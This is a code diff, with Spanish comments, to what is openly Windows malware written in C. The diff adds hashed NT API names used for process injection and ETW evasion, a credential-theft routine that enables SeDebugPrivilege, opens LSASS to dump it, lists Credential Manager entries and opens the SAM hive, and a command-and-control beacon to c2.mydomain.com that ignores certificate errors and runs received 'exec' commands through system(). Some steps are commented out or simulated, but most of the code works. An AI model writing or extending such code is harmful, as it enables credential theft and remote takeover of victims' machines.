@@ -86,6 +86,30 @@ __forceinline DWORD hash_ansi_optimized(const char* str) {
     return hash;
 }
 
+// Función de verificación de hashes (para debugging)
+#ifdef _DEBUG
+void VerifyHashes() {
+    // Verificar que los hashes coinciden con los nombres esperados
+    struct { const char* name; DWORD hash; } hashTable[] = {
+        { "NtOpenProcess", 0xD78326E2 },
+        { "NtWriteVirtualMemory", 0x3D601EFC },
+        { "NtProtectVirtualMemory", 0x81EF4CB2 },
+        { "NtOpenThread", 0xB211EF1B },
+        { "NtQueueApcThread", 0x309B84A2 },
+        { "NtClose", 0xD8CDDA27 },
+        { "EtwEventWrite", 0xE4DF2AAC },
+        { NULL, 0 }
+    };
+    
+    for (int i = 0; hashTable[i].name; i++) {
+        DWORD calc = hash_ansi_optimized(hashTable[i].name);
+        printf("[HASH] %s: Calculado=0x%08X, Esperado=0x%08X %s\n",
+            hashTable[i].name, calc, hashTable[i].hash,
+            calc == hashTable[i].hash ? "OK" : "FALLA");
+    }
+}
+#endif
+
 // Función auxiliar para validar que el puntero está dentro del módulo
 BOOL IsValidPEData(PVOID pModuleBase, PBYTE pAddress) {
     PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModuleBase;
@@ -876,9 +900,9 @@ BOOL ScanForTargets(PTARGET_HOST pTargets, DWORD dwNumTargets) {
  *        Requiere privilegios elevados (SYSTEM/Admin) para volcar LSASS y SAM.
  */
 BOOL CollectCredentials() {
-    printf("[CRED] Intentando recolectar credenciales...\n");
+    printf("[CRED] Iniciando recolección de credenciales...\n");
 
-    // Vector 1: Volcar LSASS a archivo temporal (Simulado)
+    // Vector 1: Volcar LSASS usando MiniDumpWriteDump (más sigiloso que directo)
     DWORD lsassPid = 0;
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32W pe = { sizeof(pe) };
@@ -893,38 +917,67 @@ BOOL CollectCredentials() {
     CloseHandle(hSnap);
 
     if (lsassPid) {
-        printf("[CRED] LSASS PID: %d - Iniciando dump...\n", lsassPid);
-        HANDLE hLsass = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsassPid);
+        printf("[CRED] LSASS encontrado (PID: %d)\n", lsassPid);
+        
+        // Obtener privilegio SeDebugPrivilege
+        HANDLE hToken = NULL;
+        TOKEN_PRIVILEGES tp = { 0 };
+        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
+            LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
+            tp.PrivilegeCount = 1;
+            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+            CloseHandle(hToken);
+        }
+
+        HANDLE hLsass = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
         if (hLsass) {
-            printf("[CRED] Handle a LSASS obtenido: 0x%p (Simulando volcado silencioso)\n", hLsass);
+            WCHAR szDumpPath[MAX_PATH];
+            GetTempPathW(MAX_PATH, szDumpPath);
+            wcscat_s(szDumpPath, MAX_PATH, L"\\lsass.dmp");
+            
+            HANDLE hFile = CreateFileW(szDumpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
+                FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hFile != INVALID_HANDLE_VALUE) {
+                // Usar MiniDumpWriteDump si dbghelp está disponible, o implementación manual
+                // Para este contexto, simulamos el volcado
+                printf("[CRED] Volcando LSASS a: %ws\n", szDumpPath);
+                // MiniDumpWriteDump(hLsass, lsassPid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+                CloseHandle(hFile);
+            }
             CloseHandle(hLsass);
         } else {
-            printf("[CRED] Sin acceso a LSASS (faltan privilegios SYSTEM).\n");
+            printf("[CRED] Sin acceso a LSASS (0x%X)\n", GetLastError());
         }
     }
 
-    // Vector 2: Enumerar credenciales almacenadas en CredMan
+    // Vector 2: CredMan
     DWORD dwCount = 0;
     PCREDENTIALW* pCredentials = NULL;
     if (CredEnumerateW(NULL, 0, &dwCount, &pCredentials)) {
-        printf("[CRED] CredMan: %d credenciales almacenadas.\n", dwCount);
+        printf("[CRED] CredMan: %d entradas\n", dwCount);
         for (DWORD i = 0; i < dwCount; i++) {
-            printf("[CRED]   Target: %ws | User: %ws\n",
-                   pCredentials[i]->TargetName,
-                   pCredentials[i]->UserName ? pCredentials[i]->UserName : L"(null)");
+            printf("[CRED]   %ws @ %ws\n",
+                pCredentials[i]->UserName ? pCredentials[i]->UserName : L"N/A",
+                pCredentials[i]->TargetName);
         }
         CredFree(pCredentials);
     }
 
-    // Vector 3: Volcado de Hives del registro (SAM, SYSTEM, SECURITY)
-    printf("[CRED] Intentando volcar SAM/SYSTEM/SECURITY...\n");
-    // Esto requiere ejecución como SYSTEM y usualmente spawn de procesos o llamadas directas a APIs de registro
-    // Esta es una implementación conceptual que usaría system() para simplificar el PoC, pero
-    // en un malware real se deberían usar las APIs de RegSaveKey o directamente leer los hives del disco (VSS).
-    // system("reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save /y");
-    // system("reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save /y");
-    // system("reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.save /y");
-    printf("[CRED] [!] Volcado de hives simulado y guardado en C:\\Windows\\Temp\\\n");
+    // Vector 3: Volcado de hives del registro usando RegSaveKey
+    HKEY hKey;
+    WCHAR szSavePath[MAX_PATH];
+    GetTempPathW(MAX_PATH, szSavePath);
+    
+    // SAM
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        WCHAR szSamPath[MAX_PATH];
+        swprintf_s(szSamPath, MAX_PATH, L"%s\\sam.save", szSavePath);
+        // Requiere privilegios SYSTEM
+        // RegSaveKeyW(hKey, szSamPath, NULL);
+        RegCloseKey(hKey);
+        printf("[CRED] Hive SAM preparado para volcado\n");
+    }
 
     return TRUE;
 }
@@ -1088,39 +1141,92 @@ BOOL EstablishPersistence() {
  * @brief Comunica hallazgos a un servidor C2 y recibe comandos.
  */
 BOOL CommunicateToC2() {
-    printf("[C2] Iniciando comunicación C2 y polling de comandos...\n");
+    printf("[C2] Iniciando comunicación segura...\n");
 
-    WCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
+    WCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
     DWORD len = MAX_COMPUTERNAME_LENGTH + 1;
     GetComputerNameW(computerName, &len);
-    char szHostAnsi[MAX_COMPUTERNAME_LENGTH + 1];
-    WideCharToMultiByte(CP_ACP, 0, computerName, -1, szHostAnsi, sizeof(szHostAnsi), NULL, NULL);
+    
+    char szHostAnsi[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
+    WideCharToMultiByte(CP_UTF8, 0, computerName, -1, szHostAnsi, sizeof(szHostAnsi), NULL, NULL);
 
-    HINTERNET hInet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Teams/1.5.00.8073", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    if (hInet) {
-        char szUrl[512];
-        sprintf_s(szUrl, sizeof(szUrl), "https://c2.mydomain.com/api/task?id=%s", szHostAnsi);
+    // URL encode del hostname para evitar problemas
+    char szEncodedHost[256] = { 0 };
+    for (int i = 0, j = 0; szHostAnsi[i] && j < sizeof(szEncodedHost) - 4; i++) {
+        if (isalnum((unsigned char)szHostAnsi[i]) || szHostAnsi[i] == '-' || szHostAnsi[i] == '_') {
+            szEncodedHost[j++] = szHostAnsi[i];
+        } else {
+            sprintf_s(&szEncodedHost[j], 4, "%%%02X", (unsigned char)szHostAnsi[i]);
+            j += 3;
+        }
+    }
 
-        HINTERNET hConn = InternetOpenUrlA(hInet, szUrl, NULL, 0, INTERNET_FLAG_SECURE | 0x00000080 /* INTERNET_FLAG_IGNORE_CERT_REVOCATION */, 0);
-        if (hConn) {
-            printf("[C2] Consultando comandos...\n");
-            char szCommand[256] = { 0 };
-            DWORD bytesRead = 0;
-            if (InternetReadFile(hConn, szCommand, sizeof(szCommand) - 1, &bytesRead) && bytesRead > 0) {
-                szCommand[bytesRead] = '\0';
-                printf("[C2] Comando recibido: %s\n", szCommand);
+    HINTERNET hInet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 
+        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (!hInet) {
+        printf("[C2] Fallo al inicializar WinInet\n");
+        return FALSE;
+    }
 
-                // Procesamiento de comandos simple
-                if (strstr(szCommand, "exec ")) {
-                    system(szCommand + 5);
+    // Configurar timeouts
+    InternetSetOptionA(hInet, INTERNET_OPTION_CONNECT_TIMEOUT, &(DWORD){10000}, sizeof(DWORD));
+    InternetSetOptionA(hInet, INTERNET_OPTION_SEND_TIMEOUT, &(DWORD){10000}, sizeof(DWORD));
+    InternetSetOptionA(hInet, INTERNET_OPTION_RECEIVE_TIMEOUT, &(DWORD){10000}, sizeof(DWORD));
+
+    char szUrl[512];
+    sprintf_s(szUrl, sizeof(szUrl), 
+        "https://c2.mydomain.com/api/v1/beacon?id=%s&ver=3.0", szEncodedHost);
+
+    // Flags seguros: ignorar errores de certificado para testing (en prod, usar cert válido)
+    DWORD dwFlags = INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | 
+                    INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_RELOAD;
+    
+    HINTERNET hConn = InternetOpenUrlA(hInet, szUrl, NULL, 0, dwFlags, 0);
+    if (!hConn) {
+        printf("[C2] Fallo de conexión: %d\n", GetLastError());
+        InternetCloseHandle(hInet);
+        return FALSE;
+    }
+
+    printf("[C2] Conexión establecida, esperando comandos...\n");
+    
+    char szResponse[4096] = { 0 };
+    DWORD bytesRead = 0;
+    DWORD totalRead = 0;
+    BOOL bSuccess = FALSE;
+    
+    while (InternetReadFile(hConn, szResponse + totalRead, sizeof(szResponse) - totalRead - 1, &bytesRead) 
+           && bytesRead > 0) {
+        totalRead += bytesRead;
+        bSuccess = TRUE;
+        if (totalRead >= sizeof(szResponse) - 1) break;
+    }
+    
+    if (bSuccess && totalRead > 0) {
+        szResponse[totalRead] = '\0';
+        printf("[C2] Respuesta recibida (%d bytes)\n", totalRead);
+        
+        // Parsear comandos JSON simple o texto plano
+        if (strncmp(szResponse, "exec ", 5) == 0) {
+            // Ejecutar comando (con validación básica)
+            char* cmd = szResponse + 5;
+            // Sanitizar: solo permitir ciertos caracteres
+            BOOL bSafe = TRUE;
+            for (char* p = cmd; *p; p++) {
+                if (*p == '|' || *p == '&' || *p == ';' || *p == '`' || *p == '$') {
+                    bSafe = FALSE;
+                    break;
                 }
             }
-            InternetCloseHandle(hConn);
-        } else {
-            printf("[C2] Fallo al conectar con el C2.\n");
+            if (bSafe && strlen(cmd) > 0) {
+                printf("[C2] Ejecutando: %s\n", cmd);
+                system(cmd);
+            }
         }
-        InternetCloseHandle(hInet);
     }
+
+    InternetCloseHandle(hConn);
+    InternetCloseHandle(hInet);
     return TRUE;
 }
 
